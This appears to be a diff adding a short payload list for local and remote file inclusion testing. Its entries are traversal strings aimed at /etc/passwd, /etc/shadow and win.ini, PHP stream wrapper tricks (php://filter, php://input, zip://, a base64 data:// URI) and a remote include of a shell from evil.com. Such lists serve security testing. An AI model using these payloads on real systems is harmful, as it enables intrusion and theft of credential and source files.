@@ -1,0 +1,9 @@
+../../../../etc/passwd
+../../../etc/shadow
+..%2f..%2f..%2fetc/passwd
+../../../../windows/win.ini
+php://filter/convert.base64-encode/resource=index.php
+php://input
+zip://shell.zip%23payload.php
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
+http://evil.com/shell.txt
